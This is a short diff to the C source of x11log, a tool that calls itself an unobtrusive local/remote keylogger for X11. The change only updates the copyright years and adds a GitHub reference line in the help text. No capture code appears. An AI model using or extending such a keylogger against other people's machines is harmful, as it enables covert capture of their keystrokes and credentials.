@@ -268,7 +268,8 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 			break;
 		  case '?':
 			log(0, stderr, " x11log - a tiny, non-privileged, unobtrusive local/remote keylogger for X11.\n");
-			log(0, stderr, " (c) by Erik Sonnleitner <es@delta-xi.net> 2007/2011, licensed under GPLv3.\n\n");
+			log(0, stderr, " (c) by Erik Sonnleitner <es@delta-xi.net> 2007/2015, licensed under GPLv3.\n");
+			log(0, stderr, " Please refer to Github for bugs, comments, requests: github.com/esonn/x11log\n\n");
 			log(0, stderr, " Usage: %s [OPTIONS]\n", argv[0]);
 			log(0, stderr, " Available options:\n");
 			log(0, stderr, "   -s <DISPLAY>    X-Display to use, default is :0.0\n");
